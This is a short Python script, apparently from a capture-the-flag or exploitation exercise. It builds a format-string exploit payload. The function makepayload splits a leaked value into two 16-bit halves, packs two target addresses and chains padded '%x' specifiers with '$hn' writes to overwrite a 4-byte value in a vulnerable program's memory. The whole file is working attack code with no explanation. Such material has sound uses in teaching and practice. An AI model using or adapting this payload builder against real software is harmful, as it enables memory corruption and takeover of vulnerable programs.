import struct
def p32(val):
    return str(struct.pack("<I", val))

def makepayload(leak, addr, offset):
    MSB = int((leak)[2:6],16)
    LSB = int((leak)[6:10],16)

    if (MSB <= LSB):         
   	payload = p32(addr + 2)+p32(addr)+"%"+str(MSB-8) +"x%"+ offset + "$hn"+"%"+str(abs(LSB-MSB))+ "x%" + str(int(offset) + 1) + "$hn"
  
    else: 
  	payload = p32(addr)+p32(addr + 2)+"%"+str(LSB-8) +"x%" + offset +"$hn"+"%"+str(abs(MSB-LSB))+"x%" + str(int(offset) + 1) +"$hn"

    return payload 
